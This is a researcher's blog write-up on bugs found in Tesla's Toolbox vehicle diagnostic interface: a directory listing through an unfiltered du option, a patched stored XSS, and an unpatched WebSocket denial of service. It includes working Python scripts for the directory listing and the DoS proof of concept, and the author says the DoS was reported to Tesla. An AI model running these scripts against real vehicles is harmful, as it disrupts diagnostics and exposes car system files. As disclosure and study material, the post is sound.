---
layout: post
title: "An attempt to find bugs on the Tesla toolbox"
tags: [Tesla, Websocket, Diagnostic, DoS, Directory listing, XSS]
---

Several months ago, I had the opportunity to examine the Toolbox, a web-based diagnostic interface for Tesla vehicles. During that time, I was using an older firmware version, which enabled me to discover a few bugs that had already been patched.
I also found an unpatched bug that still works in the latest version of the firmware, which I'll detail below.

## The ToolBox

Most vehicles have an OBD2 port and offer diagnostic services through CAN communication via the OBD2 port. However, Tesla utilizes an Ethernet-based diagnostic environment called **ToolBox**, which serves as a web frontend.

For the Model 3 and Model Y, you can access the diagnostic service by connecting your Tesla and PC using a cable as shown in the figure below. One end of the cable connects to a PC via an RJ45 port, while the other end with a 4-pin connector connects to the lower left diagnostic port on the driver's side of the car. The cable is readily available on Aliexpress or Amazon.

<!--![Diagnostic Cable for Tesla ToolBox](/assets/images/Tesla-Toolbox/diagnostic-cable.png "Diagnostic Cable for Tesla ToolBox")-->

<img src="/assets/images/Tesla-Toolbox/diagnostic-cable.png" width="400" height="400">

<!--![4-pin diagnostic port on the lower left side of the driver's seat]()-->

<img src="/assets/images/Tesla-Toolbox/4pin-diagnostic-port.png" width="400" height="400">


Tesla Toolbox can be accessed through the following link: [https://toolbox.tesla.com/](https://toolbox.tesla.com/), and requires a paid subscription. To connect your vehicle, visit the link and click on the gray box located in the upper right corner.

![Untitled](/assets/images/Tesla-Toolbox/Toolbox-main-page.png)
To perform diagnostics using the Tesla Toolbox, the IP address of the PC must be in the network address space of the vehicle. I setted IP address of the PC to  `192.168.90.110/255.255.255.0` . Any IP address in the `192.168.90.0/24` subnet that is not assigned to the vehicle's ECU should be fine. Here is a list of IP addresses for Tesla ECUs that I found online. The ECU responsible for diagnostic service in tesla is CID/ICE and the address is 192.168.90.100

| ECU | IP Address | Description |
| --- | --- | --- |
| CID/ICE | 192.168.90.100 | Controls the display and media systems. |
| Autopilot (primary) | 192.168.90.103 | Controls the autopilot system. |
| Autopilot (secondary) | 192.168.90.105 | Backup autopilot system. |
| Gateway | 192.168.90.102 | Controls the switch, vehicle config, and proxies requests between the ethernet side and the CAN BUS. |
| Modem | 192.168.90.60 | LTE modem. |
| Tuner | 192.168.90.60 | AM/FM radio. Not present on newer Model 3 cars. |


# The patched

### Directory Listing

After a quick look at the toolbox, I noticed that The vehicle and PC communicate through WebSocket at the endpoint `ws://192.168.90.100:8080/api/v1/products/current/messages/commands`

![Untitled](/assets/images/Tesla-Toolbox/dev-console.png)

The JSON data format for the communication is as follows

```json
{
    "request_id": "007b45c3-ed94-4804-9928-93e0cbf4a0d1",
    "request_payload": {
        "command": "get_vin",
        "request_id": "007b45c3-ed94-4804-9928-93e0cbf4a0d1",
        "message_type": "command",
        "broadcast_permanent_topics": true
    },
    "response": null,
    "hermes_status": 3202
}
```

After I figured out that I could pass a command to `request_payload` with the `command` argument, I looked up the available command types.

Here is a list of the commands that we can use.

```xml
get_vin
status
execute
list_tasks
ping
lock
unlock
start_orchestrator
stop_orchestrator
list_requests    
cancel_request  
read_dtcs   
clear_dtcs
```

Here is a partial output of the `list_task` command. The `name` field is the command that you can request.

```json
			.
			.
			.
{
  "title": "DAS Capture Image",
  "description": "",
  "dependencies": "",
  "cancelable": true,
  "valid_states": [
    "StandStill|Parked"
  ],
  "post_fusing_allowed": false,
  "message": {
    "command": "execute",
    "args": {
      "name": **"Common/tasks/PROC_DAS_X_CAPTURE-IMAGE"**
    }
  },
  "name": "PROC_DAS_X_CAPTURE-IMAGE",
  "inputs": {}
},
			.
			.
			.
```

While executing the tasks obtained by list_task one by one, I guessed that the TEST-BASH_ICE_X_CHECK-DISK-USAGE command is internally bound to the `du` command, and after checking some options of the du command are not filtered, I confirmed that I can list the desired directory files by setting options such as `-ahld100`.

```json
{
  "title": "ICE Check Disk Usage",
  "description": "Check disk usage in a list of paths, default includes common files like caches",
  "dependencies": "",
  "cancelable": false,
  "valid_states": [
    "StandStill|Drive",
    "StandStill|Neutral",
    "StandStill|Parked",
    "Moving|Drive",
    "Moving|Neutral"
  ],
  "post_fusing_allowed": false,
  "message": {
    "command": "execute",
    "args": {
      "name": "Common/tasks/TEST-BASH_ICE_X_CHECK-DISK-USAGE"
    }
  },
  "name": "TEST-BASH_ICE_X_CHECK-DISK-USAGE",
  "inputs": {
    "directories": {
      "datatype": "List",
      "default": [
        "/home/tesla/.Tesla/data/drivenotes",
        "/home/tesla/.Tesla/cache",
        "/home/tesla/.Tesla/cache/map_tiles_v3/tile_cache",
        "/home/tesla/.Tesla/data/screenshots",
        "/home/tesla/.crashlogs",
        "/home/tesla/media",
        "/home/ecallclient/.Tesla/data",
        "/home/gpsmanager/.Tesla/data",
        "/home/mediaserver/.Tesla/data",
        "/home/monitord/.Tesla/data",
        "/home/spotify/.Tesla/data",
        "/home/tesla/.Tesla/data",
        "/home/tuner/.Tesla/data",
        "/home/qtaudiod/.Tesla/data",
        "/home/mediaserver/cache",
        "/home/dashcam"
      ]
    },
    "parameters": {
      "datatype": "List",
      "default": [
        "-sm"
      ]
    }
  }
}
```


I wrote a script in python to list the files under a specific directory.

```python
import asyncio
import websockets
import json
import time
import sys

async def webs_fuzz():
    async with websockets.connect("ws://192.168.90.100:8080/api/v1/products/current/messages/commands") as websocket:
        msg = {
                "command":"execute",
                "args":
                    {
                     "name":"Common/tasks/TEST-BASH_ICE_X_CHECK-DISK-USAGE",
                     "kw":
                        {
                            "directories":[sys.argv[1]],
                            "parameters":["-ahld100"]
                        }
                    },
                    "skip_vehicle_checks":"false",
                    "request_id":"tbx3-214b9a22-80cd-4b63-8ab8-19cdb923b151",
                    "token":"Something",
										"intermediate_certificate":"-----BEGIN CERTIFICATE-----\nredacted\n-----END CERTIFICATE-----\n"
                    }
                }

        msg = json.dumps(msg)
        await websocket.send(msg)
        time.sleep(0.5)
        res = await websocket.recv()
        res = await websocket.recv()
        print(json.dumps(json.loads(res), indent=4))

start_server = websockets.serve

asyncio.get_event_loop().run_until_complete(webs_fuzz())
```

Since now i can see which file is reside inside CID/ICE system, i searched up some files of the Toolbox webserver. The location of the webserver directory is `/opt/odin/core/engine/` and unfortunatly most of the files are whiteliested and I can only read a image file like `/opt/odin/core/engine/assets/img/starman_750x750.png`

![starman_750x750.png](/assets/images/Tesla-Toolbox/starman750x750.png)


Tesla's CID has an open ssh port and ssh authentication with a sign certificate, so I thought it was possible to access ssh if I could read the key that exists on the system, and I looked at the commands for reading files among the available tasks, but there was strong whitelisting filtering, so I couldn't bypass it.

### Stored XXS

The [http://192.168.90.100:8080](http://192.168.90.100:8080/) endpoint records completed diagnostic tasks and their execution results, and the "name":"Common/tasks/TEST-BASH_ICE_X_CHECK-DISK-USAGE" of the endpoint is not XXS filtered, resulting in a stored xxs vulnerability.

An attacker could inject malicious javascript code into the “name” argument and then execute the attacker's javascript code when the endpoint is accessed by the service center.

Unfortunately, I didn't take a screenshot and also this bug has been patched in the latest version.

### SOME/IP?

Seems interesting Tesla has vsomeip which is for someip communication.

```python
"22.5K\t/usr/bin/vsomeipd",
"2.5K\t/usr/etc/vsomeip/vsomeip-local.json",
"1.5K\t/usr/etc/vsomeip/vsomeip-tcp-client.json",
"2.5K\t/usr/etc/vsomeip/vsomeip-tcp-service.json",
"1.5K\t/usr/etc/vsomeip/vsomeip-udp-client.json",
"2.5K\t/usr/etc/vsomeip/vsomeip-udp-service.json",
"1.5K\t/usr/etc/vsomeip/vsomeip.json",
"12.0K\t/usr/etc/vsomeip"
"35.5K\t/etc/vsomeip.json",
"0\t/usr/lib/libCommonAPI-SomeIP.so",
"2.7M\t/usr/lib/libCommonAPI-SomeIP.so.3.1.10",
"0\t/usr/lib/libvsomeip-cfg.so",
"0\t/usr/lib/libvsomeip-cfg.so.2",
"275.5K\t/usr/lib/libvsomeip-cfg.so.2.7.0",
"0\t/usr/lib/libvsomeip-diagnosis-plugin-mgu.so",
"0\t/usr/lib/libvsomeip-diagnosis-plugin-mgu.so.1",
"18.0K\t/usr/lib/libvsomeip-diagnosis-plugin-mgu.so.2.7.0-1.0.0",
"0\t/usr/lib/libvsomeip-sd.so",
"0\t/usr/lib/libvsomeip-sd.so.2",
"287.5K\t/usr/lib/libvsomeip-sd.so.2.7.0",
"0\t/usr/lib/libvsomeip.so",
"0\t/usr/lib/libvsomeip.so.2",
"1.4M\t/usr/lib/libvsomeip.so.2.7.0",
```

## The Non Patched bug

While looking at the arguments of the websocket connection using a web proxy tool, I noticed something strange.

Sometimes, when sending a request for json data ("{") with incorrect syntax to websocket and sending a normal list_task command, a 500 error message was returned as shown in the figure, and it was no longer possible to connect to the vehicle via toolbox.

![Untitled](/assets/images/Tesla-Toolbox/500Error.png)

After reproducing the same situation again, I took a look at the packet dump and found a strange phenomenon.

As the response of a normal list_task message (port 1052) came to the port (1053) with abnormal syntax json data ("{"), the header of the websocket message was broken, and the webserver could not process the opcode of the websocket header properly, causing the websocket-related instance of the webserver to be crashed

![Untitled](/assets/images/Tesla-Toolbox/wireshark-output.png)

The websocket header structure is shown below.

![Untitled](/assets/images/Tesla-Toolbox/websocket-header.png)

- **`FIN`** (1 bit): Indicates whether this is the final fragment in a message. The first fragment has this bit set to 1.
- **`RSV1`**, **`RSV2`**, **`RSV3`** (1 bit each): Reserved bits. Must be 0 unless an extension has been negotiated that defines meanings for non-zero values.
- **`opcode`** (4 bits): Defines the interpretation of the payload data. If an unknown opcode is received, the receiving endpoint must close the connection.
- **`MASK`** (1 bit): Indicates whether the message payload is masked. If set to 1, a masking key is included in the header.

The types of opcodes 

- opcode types
    - 0x0 - Continuation Frame
    - 0x1 - Text Frame
    - 0x2 - Binary Frame
    - 0x3-7 - Reserved for further non-control frames
    - 0x8 - Connection Close
    - 0x9 - Ping
    - 0xA - Pong
    - 0xB-F - Reserved for further control frames

Since the webserver of the tesla toolbox does not properly handle other opcodes in the websocket header except for Text Frame, Binary Frame, Ping, and Pong, the server-side websocket instance will disappear when the unhandled opcodes come in a certain order.

After the instance disappears, the response to all commands will be a NoneType object has no attribute 'call_exception_handler', which means that the car will be unreachable and unable to give any commands from the toolbox, leaving it in DOS state.

![Untitled](/assets/images/Tesla-Toolbox/Nonetype.png)

I immediately wrote a POC code and submitted it to Tesla.

```python
import json
import socket
import struct
import secrets
import select
from random import choice

def connect_to_server(host, dst_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    client_socket.connect((host, dst_port))
    client_socket.settimeout(0.2)
    return client_socket

# Upgrade to Websocket Connection
def send_handshake_request(client_socket, host, path, port):
    request = "GET {} HTTP/1.1\r\n".format(path)
    request += "Host: {}:{}\r\n".format(host, port)
    request += "Connection: Upgrade\r\n"
    request += "Pragma: no-cache\r\n"
    request += "Cache-Control: no-cache\r\n"
    request += "User-Agent: no-cache\r\n"
    request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\n"
    request += "Upgrade: websocket\r\n"
    request += "Origin: https://toolbox.tesla.com\r\n"
    request += "Sec-WebSocket-Version: 13\r\n"
    request += "Accept-Encoding: gzip, deflate\r\n"
    request += "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n"
    request += "Sec-WebSocket-Key: uKtd9i3rUH7gk7s7RB0gyA==\r\n\r\n"
    
    client_socket.send(request.encode('utf-8'))

def receive_handshake_response(client_socket):
    response = ""

    while True:
        try:
            data = client_socket.recv(1024).decode('utf-8')
            response += data
            if "\r\n\r\n" in response:
                break
        except socket.timeout:
            break
    return response

def parse_handshake_response(response):
    lines = response.split("\r\n")
    status_line = lines[0]
    headers = {}

    for line in lines[1:]:
        if ": " in line:
            key, value = line.split(": ")
            headers[key] = value

    return status_line, headers

# Send data include Websocket header
def send_data(client_socket, data, opcode=1):
    mask = secrets.token_bytes(4)
    payload_length = len(data)

    if payload_length <= 125:
        header = struct.pack('>BB', 0x80 | opcode, 0x80 | payload_length)
    elif payload_length <= 65535:
        header = struct.pack('>BBH', 0x80 | opcode, 0x80 | 126, payload_length)
    else:
        header = struct.pack('>BBQ', 0x80 | opcode, 0x80 | 127, payload_length)

    masked_data = bytearray(data.encode('utf-8'))

    for i in range(payload_length):
        masked_data[i] ^= mask[i % 4]
    packet = header + mask + masked_data

    try:
        client_socket.send(packet)
        return True
    except ConnectionAbortedError:
        return False

def receive_all(client_socket):
    data = b''

    while True:
        try:
            chunk = client_socket.recv(1024)
            if not chunk:
                break
            data += chunk
        except TimeoutError:
            break

    return data

def receive_data(client_socket, bytes):
    data = b''

    try: 
        return client_socket.recv(bytes)
    except socket.timeout:
        return data

def run_websocket_client(host, dst_port, path):
    client_socket = connect_to_server(host, dst_port)
    send_handshake_request(client_socket, host, path, dst_port)
    response = receive_handshake_response(client_socket)
    parse_handshake_response(response)
    return client_socket

if __name__ == "__main__":
    host = "192.168.90.100"
    port = 8080
    path = "/api/v1/products/current/messages/commands"

    # ** You have to change the token value with valid one so that you can use `list_tasks` commands **
    # ** Simply copy the whole JSON data from developer tools and paste right next to task_list_msg variable **
    task_list_msg = {"command":"list_tasks","request_id":"tbx3-f0052249-23dd-4b2c-8281-c7b8e20469e0","token":"redacted","tokenv2":{"token":"redacted","intermediate_certificate":"-----BEGIN CERTIFICATE-----\nredacted\n-----END CERTIFICATE-----\n"}}
    task_list_msg = json.dumps(task_list_msg,separators=(",", ":"))
    # Any character that doesn't comply with the JSON syntax would be ok
    vuln_msg = "{"

    while True:
        task_list_msg_socket = run_websocket_client(host, port, path)
        vuln_msg_socket = run_websocket_client(host, port, path)

        # Sending an invalid JSON message
        send_data(vuln_msg_socket, vuln_msg) 
        # You'll get an error message
        receive_all(vuln_msg_socket)
        # Sending a `list_tasks` command request which respond with multiple websocket packets
        send_data(task_list_msg_socket, task_list_msg) 
        # Normal response of `list_tasks` request
        receive_all(task_list_msg_socket)
        # Normal response of `list_tasks` request also duplicated on vuln_msg_socket
        receive_all(vuln_msg_socket)
        inputs = [vuln_msg_socket]

        try:
            # You must send Websocket data with an opcode that server cannot handle properly at the same time as you are receiving websocket messages 
            while True:
                readable, writeable, exceptional = select.select(inputs, [], [])
                for s in readable:
                    try:
                        d = s.recv(512)
                        # Except for 0x1, 0x2, 0x9, and 0xA, other opcodes are not handled correctly
                        send_data(s, vuln_msg, choice([0x0, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0xb, 0xc, 0xd, 0xe, 0xf]))
                    except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                        print("DOS Succeeded!")
                        exit()
                    if d.decode("utf-8", errors="replace").find("hermes_status") > -1:
                        s.close()
                        break
        except KeyboardInterrupt: 
            exit()
        except ValueError:
            continue
```

## Low impact

One of the most important things about finding bugs is that just because something causes an unintended behavior doesn't mean it's a vulnerability. Since TESLA's diagnostic function requires a local connection to a PC, and even a DOS attack can be reversed by rebooting the vehicle, the impact of the attack is minimal, so it's hard to come up with a valid attack scenario, so I didn't get any recognition for the bug I reported.

It's unfortunate, but the point is that I enjoyed the process of finding vulnerabilities and learned a lot, and I'm happy to share the experience.


